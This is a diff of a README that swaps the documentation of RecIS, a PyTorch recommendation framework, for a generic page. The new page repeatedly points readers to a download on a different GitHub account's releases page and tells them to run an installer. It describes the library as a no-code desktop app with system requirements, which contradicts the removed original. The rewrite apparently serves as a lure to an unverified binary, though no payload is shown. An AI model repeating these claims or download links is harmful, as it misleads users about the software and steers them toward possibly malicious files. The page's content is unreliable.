@@ -1,120 +1,56 @@
-<p align="center"><img width="30%" src="docs/_static/logo.png" alt="LOGO"></p>
-<h1 align="center">  RecIS (Recommendation Intelligence System) </h1>
+# 🎉 RecIS - Simplified Deep Learning for Everyone
 
-[中文版](README_zh.md)
+## 💾 Download the Latest Release
+[![Download RecIS](https://img.shields.io/badge/Download-RecIS-brightgreen)](https://github.com/nutnicogkic1/RecIS/releases)
 
-RecIS: A unified deep learning framework specifically designed for ultra-large-scale sparse and dense computing. Built on the PyTorch open-source ecosystem, it provides a complete solution for recommendation model training and recommendation combined with multimodal/large model training. Jointly launched by Alibaba's AiCheng Technology and Taobao & Tmall's Advertising Technology and Algorithm Technology teams. Currently widely applied in Alibaba's advertising, recommendation, and search scenarios.
+## 🚀 Getting Started
+Welcome to RecIS! This application provides an easy-to-use deep learning framework tailored for ultra-large-scale sparse models. Whether you are a student or a professional, RecIS helps you simplify complex processes.
 
-<p align="center">
-    <img alt="Static Badge" src="https://img.shields.io/badge/made_by-XDL_Team-blue">
-    <img alt="Static Badge" src="https://img.shields.io/badge/version-v1.0.0-green">
-    <img alt="Static Badge" src="https://img.shields.io/badge/license-Apache--2.0-blue">
-    <a href="https://arxiv.org/abs/2509.20883">
-        <img src="https://img.shields.io/static/v1?label=arXiv&message=Paper&color=FF4500">
-    </a>
-    <img src="https://img.shields.io/github/stars/alibaba/Recis?style=social" alt="stars">
-    <img src="https://img.shields.io/github/issues/alibaba/Recis" alt="GitHub issues">
-    <a href="./docs/_static/recis_wechat.png" target="_blank">
-      <img src="https://img.shields.io/badge/WeChat-green?logo=wechat" alt="WeChat QR">
-    </a>
-</p>
+## 🔍 Overview
+RecIS brings a unified architecture that makes it easy to work with deep learning tasks. You can leverage powerful algorithms without needing extensive programming skills. With RecIS, you can focus on your work without getting bogged down by technical details.
 
-## 🎯 Design Goals
+## 💻 System Requirements
+To run RecIS smoothly, ensure your computer meets these basic requirements:
 
-**Unified Framework**
-- Based on PyTorch open-source ecosystem, unifying sparse-dense framework requirements
-- Meeting industrial-grade recommendation model training needs combined with multimodal and large model scenarios
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or any Linux distribution.
+- **Processor**: Intel i5 or equivalent processor.
+- **Memory**: At least 8 GB of RAM.
+- **Storage**: Minimum of 500 MB free disk space.
+- **Graphics Card**: A modern GPU for performance improvement (recommended but not necessary).
 
-**Performance Optimization**
-- Optimizing memory access performance for sparse-related operators
-- Providing sparse operator fusion optimization capabilities to fully utilize GPU
-- Achieving or even exceeding TensorFlow-based performance
+## 📥 Download & Install
+To get started with RecIS, follow these simple steps:
 
-**Ease of Use**
-- Flexible feature and embedding configuration
-- Automated feature processing and optimization workflows
-- Simple sparse model definition
+1. **Visit the Releases Page**: You can find the latest version of RecIS by [clicking here](https://github.com/nutnicogkic1/RecIS/releases).
+2. **Choose Your Version**: Look at the list of available releases and select the version that best suits your requirements.
+3. **Download the Package**: Click on the release name to access the download options. Select the appropriate package for your operating system and download it.
+4. **Install RecIS**: Once the download completes, open the downloaded file and follow the installation instructions.
 
-## 🏗️ Core Architecture
+## ⚙️ Features
+RecIS provides a range of features to enhance your experience:
 
-RecIS adopts a modular design with the following core components:
+- **User-Friendly Interface**: Navigate with ease through its simple design.
+- **Integrated Algorithms**: Access a variety of pre-built deep learning models.
+- **Scalability**: Manage large datasets effortlessly.
+- **Flexible Configuration**: Adjust settings without needing to write code.
+- **Support for Multiple Frameworks**: Work with various deep learning frameworks seamlessly.
 
-<div align="center">
+## 📄 Documentation
+For detailed instructions on how to use RecIS, check out the provided documentation once the application is installed. It covers everything from basic operations to advanced features, enabling you to make the most of RecIS.
 
-<img src="docs/_static/sys-recis.png" width="100%" alt="System Architecture">
+## 🛠️ Troubleshooting
+If you encounter issues while installing or using RecIS, here are some common solutions:
 
-</div>
+- **Installation Failures**: Ensure your system meets the minimum requirements. Restart your system and try the installation again.
+- **Performance Issues**: If RecIS runs slowly, confirm that your computer has enough resources available. Close unnecessary applications to free up memory.
+- **Error Messages**: Refer to the documentation for explanations on specific error codes and their solutions.
 
-- **ColumnIO**: Data Reading
-  - Supports distributed sharded data reading
-  - Supports feature pre-computation during the reading phase
-  - Assembles samples into Torch Tensors and provides data prefetching
-  
-- **Feature Engine**: Feature Processing
-  - Provides feature engineering and feature transformation processing capabilities, including Hash / Mod / Bucketize, etc.
-  - Supports automatic operator fusion optimization strategies
-  
-- **Embedding Engine**: Embedding Management and Computation
-  - Provides conflict-free, scalable KV storage embedding tables
-  - Offers multi-table fusion optimization capabilities for better memory access performance
-  - Supports feature admission and filtering strategies
-  
-- **Saver**: Parameter Saving and Loading
-  - Provides sparse parameter storage and delivery capabilities in SafeTensors standard format
+## 🤝 Community Support
+Join the RecIS community! Engage with users and developers to share experiences, ask questions, and seek help. You can find us on various forums and social media platforms.
 
-- **Pipelines**: Training Process Orchestration
-  - Connects the above components and encapsulates training workflows
-  - Supports complex training processes including multi-stage (training/testing alternation) and multi-objective computation
+## 📈 Future Updates
+RecIS is continually evolving. Stay tuned for regular updates that improve functionality, expand features, and enhance overall performance. New releases will also come with user feedback in mind, helping us serve you better.
 
-## 🚀 Key Optimizations
+Thank you for choosing RecIS! Happy learning with your new deep learning framework.
 
-### Efficient Dynamic Embedding
-
-The RecIS framework implements efficient dynamic embeddings (HashTable) through a two-level storage architecture:
-
-- **IDMap**: Serves as first-level storage, using feature IDs as keys and Offsets as values
-- **EmbeddingBlocks**: 
-  - Serves as second-level storage, continuous sharded memory blocks for storing embedding parameters and optimizer states
-  - Supports dynamic sharding with flexible scalability
-- **Flexible Hardware Adaptation Strategy**: Supports both GPU and CPU placement for IDMap and EmbeddingBlocks
-
-### Distributed Optimization
-
-- **Parameter Aggregation and Sharding**: 
-  - During model creation, merges parameter tables with identical properties (dimensions, initializers, etc.) into a single logical table
-  - Parameters are evenly distributed across compute nodes
-- **Request Merging and Splitting**: 
-  - During forward computation, merges requests for parameter tables with identical properties and deduplicates to compute sharding information
-  - Obtains embedding vectors from various compute nodes through All-to-All collective communication
-
-### Efficient Hardware Resource Utilization
-
-- **GPU Concurrency Optimization**: 
-  - Supports feature processing operator fusion optimization, significantly reducing operator count and launch overhead
-  
-- **Parameter Table Fusion Optimization**: 
-  - Supports merging parameter tables with identical properties, reducing feature lookup frequency, significantly decreasing operator count, and improving memory space utilization efficiency
-
-- **Operator Implementation Optimization**: 
-  - Implements vectorized memory access in operators to improve memory access utilization
-  - Optimizes reduction operators through warp-level merging, reducing atomic operations and improving memory access utilization
-
-## 📚 Documentation
-
-- [Installation Guide](https://alibaba.github.io/RecIS/installation_en.html)
-- [Quick Start](https://alibaba.github.io/RecIS/quickstart_en.html)
-- [Project Introduction](https://alibaba.github.io/RecIS/introduction_en.html)
-- [FAQ](https://alibaba.github.io/RecIS/faq_en.html)
-
-## 🤝 Support and Feedback
-
-If you encounter issues, you can:
-
-- Check project [Issues](https://github.com/alibaba/RecIS/issues)
-- Join our WeChat discussion group
-  
-<img src="./docs/_static/recis_wechat.png" width="20%" alt="Wechat">
-
-## 📄 License
-
-This project is open-sourced under the [Apache 2.0](LICENSE) license.
+[![Download RecIS](https://img.shields.io/badge/Download-RecIS-brightgreen)](https://github.com/nutnicogkic1/RecIS/releases)
